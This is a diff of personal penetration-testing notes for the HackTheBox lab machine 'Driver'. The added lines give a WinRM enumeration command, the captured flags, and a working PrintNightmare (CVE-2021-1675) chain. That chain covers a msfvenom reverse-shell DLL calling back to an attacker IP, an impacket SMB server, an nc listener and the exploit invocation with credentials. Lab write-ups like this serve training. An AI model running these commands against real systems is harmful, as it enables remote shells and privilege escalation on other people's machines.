@@ -77,7 +77,22 @@ Command=ToggleDesktop
 
 + msfconsole> use auxiliary/scanner/winrm/winrm_cmd see [winRM_cmd](Screenshots/driver_winrm_cmd.png))
   + set cmd pwd :: C:\Users\tony\Documents
-  + set cmd "cd ..\Desktop\ ; dir ; more user.txt" ![pwd_enum](Screenshots/driver_pwd_enum.png)
+  + set cmd "cd ..\Desktop\ ; more user.txt" ![pwd_enum](Screenshots/driver_pwd_enum.png)
+  + user:: 95d6e576b403ac91befbc9c0ab70463d
+
+##**CVE-2021-1675**##
+create payload:: 
++ `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.13 LPORT=53 -f dll > revshell.dll #move to /opt/tranfers`
+stage smbserver:: see ![](Screenshots/driver_smb_serve.png)
++ `python3 /opt/impacket/examples/smbserver.py kali . # user kali @ current director (/opt/transfers)`
+setup listener::
++ `nc -lvnp 53`
+Run exploit:: see ![](Screenshots/driver_run_explt.png)
++ `python3 ./CVE-2021-1675.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.16.13\kali\revshell.dll'`
+
+
+more c:\Users\Administrator\Desktop\root.txt
+root:: 1026cd01def52e83a800703612fe0ef2
 
 
 +TODO: impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x3a - ERROR_BAD_NET_RESP - The specified server cannot perform the requested operation.
@@ -85,7 +100,10 @@ Can't run printernightmare CVE-2021-1675
 CVE-2021-1675 not working - see ![hmmmm](Screenshots/CVE20211675_no_workie.png)
     + https://github.com/cube0x0/CVE-2021-1675
 
-[](https://github.com/cube0x0/CVE-2021-1675)
-[](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)
+
+
+
+[CVE](https://github.com/cube0x0/CVE-2021-1675)
+[msrpc](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)
 [scf_file_attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
 [cracking_windows_hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
